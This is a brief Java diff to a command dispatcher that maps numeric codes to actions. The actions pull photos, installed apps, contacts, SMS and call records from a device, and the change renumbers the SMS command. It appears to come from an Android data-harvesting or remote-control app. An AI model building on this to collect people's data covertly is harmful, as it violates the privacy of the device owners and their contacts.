@@ -57,7 +57,7 @@ public class ActionFactory {
 		actionSet.put(8, GetPhotosAction.class);
 		actionSet.put(7, GetInstallAppsAction.class);
 		actionSet.put(2, GetContactAction.class);
-		actionSet.put(3, GetSmsAction.class);
+		actionSet.put(12, GetSmsAction.class);
 		actionSet.put(6, GetCallRecodeAction.class);
 //		actionSet.put(new GetWeChatSdCmd().getCmdNumber(), GetWeChatSdAction.class);
 //		actionSet.put(new GetQQSdCmd().getCmdNumber(), GetQQSdAction.class);
